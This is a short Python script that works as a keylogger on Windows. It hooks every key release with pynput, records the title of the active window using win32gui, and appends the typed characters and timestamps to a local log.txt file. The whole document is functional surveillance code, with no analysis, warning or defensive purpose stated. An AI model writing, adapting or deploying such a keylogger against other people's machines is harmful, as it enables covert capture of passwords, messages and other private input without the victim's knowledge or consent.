from pynput import keyboard
from win32gui import GetWindowText, GetForegroundWindow
import datetime

lastWindow = None

def capturing_key(key):
    global lastWindow
    window = GetWindowText(GetForegroundWindow())

    try:
        if key.vk >= 96 and key.vk <= 105:
            key = key.vk - 96
    except: pass

    key = str(key).strip("'")
    with open("log.txt", "a") as log:

        try:
            if window != lastWindow:
                lastWindow = window
                log.write("\n #### {} - {} \n".format(lastWindow, datetime.datetime.now()))
        except: pass

        if key == "Key.space":
            log.write(" ")
        elif key == "Key.enter":
            log.write("\n")
        elif key == "Key.caps_lock" or key == "Key.backspace":
            log.write(" {} ".format(key))
        elif len(key) > 1:
            log.write("")
        else:
            log.write(key)
    
with keyboard.Listener(
        on_release = capturing_key) as listener:
    listener.join()
